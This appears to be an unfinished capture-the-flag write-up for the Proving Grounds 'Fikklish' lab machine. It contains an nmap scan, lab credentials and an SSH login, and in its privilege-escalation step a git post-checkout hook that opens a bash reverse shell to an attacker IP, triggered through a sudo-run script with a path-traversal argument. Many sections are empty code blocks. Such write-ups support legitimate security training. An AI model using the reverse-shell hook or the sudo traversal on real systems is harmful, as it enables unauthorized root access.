---
title: Fikklish
parent: Proving Grounds Practice
grand_parent: Writeups
nav_order:
---
---


# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Fikklish]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.167.19 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-02 21:16 +0900
Nmap scan report for 192.168.167.19
Host is up (0.097s latency).
Not shown: 65531 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4e:eb:da:e8:00:da:40:3d:f4:22:ad:fb:41:2c:2a:4c (ECDSA)
|_  256 de:dc:7b:84:9e:6e:d8:fa:98:23:2b:9e:71:67:88:fe (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Book Bargains Online
|_http-server-header: Apache/2.4.52 (Ubuntu)
8000/tcp open  http    Python http.server 3.5 - 3.10
|_http-title:   Weblate
| http-robots.txt: 31 disallowed entries (15 shown)
| /admin/ /js/ /accounts/ /source/ /comment/ /commit/ 
| /update/ /push/ /reset/ /lock/ /unlock/ /changes/ /changes/csv/ 
|_/search/ /replace/
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.14 - 6.8 (93%), OpenWrt 22.03 (Linux 5.10) (93%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 6.18 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   98.44 ms 192.168.45.1
2   98.34 ms 192.168.45.254
3   98.37 ms 192.168.251.1
4   98.43 ms 192.168.167.19

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.58 seconds
```

http://192.168.167.19/

![[Pasted image 20260702212527.png]]

http://192.168.167.19:8000/

![[Pasted image 20260702212618.png]]

http://192.168.167.19:8000/robots.txt

![[Pasted image 20260702215457.png]]


![[Pasted image 20260702221818.png]]

Niffenegger

![[Pasted image 20260702222042.png]]

admin
niffenegger

https://security.snyk.io/vuln/SNYK-PYTHON-WEBLATE-2414088

![[Pasted image 20260702223320.png]]

![[Pasted image 20260702223632.png]]

![[Pasted image 20260702223622.png]]

![[Pasted image 20260702223749.png]]

![[Pasted image 20260702224109.png]]

![[Pasted image 20260702230710.png]]

RapidlyLockstepDrenched103
RollingShockingLifter231

![[Pasted image 20260702230916.png]]



```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Fikklish]
└─$ ssh tom@192.168.167.19
tom@192.168.167.19's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 25 12:36:30 PM UTC 2025

  System load:  0.30126953125     Processes:               242
  Usage of /:   86.2% of 8.02GB   Users logged in:         0
  Memory usage: 47%               IPv4 address for ens192: 192.168.120.130
  Swap usage:   0%

  => / is using 86.2% of 8.02GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

246 updates can be applied immediately.
140 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Apr 25 12:34:29 2025 from 192.168.118.6
```

```
tom@fikklish:~$ rm -rf pwn && mkdir pwn && cd pwn
```

```
tom@fikklish:~/pwn$ git init
echo "trigger" > trigger.txt
git add trigger.txt
git commit -m "trigger"
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /home/tom/pwn/.git/
[master (root-commit) 7c8cfba] trigger
 Committer: FIKKLISH <tom@fikklish>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 1 insertion(+)
 create mode 100644 trigger.txt
```

``` 
tom@fikklish:~/pwn$ cat > .git/hooks/post-checkout << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.155/80 0>&1
> EOF
tom@fikklish:~/pwn$ chmod +x .git/hooks/post-checkout
tom@fikklish:~/pwn$ sudo /home/tom/checkout.rb << EOF
../../home/tom/pwn
master
EOF
[sudo] password for tom: 
Name of the project: 
Location of branch: 
```

![[Pasted image 20260702234600.png]]

```zsh

```

```zsh

```

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>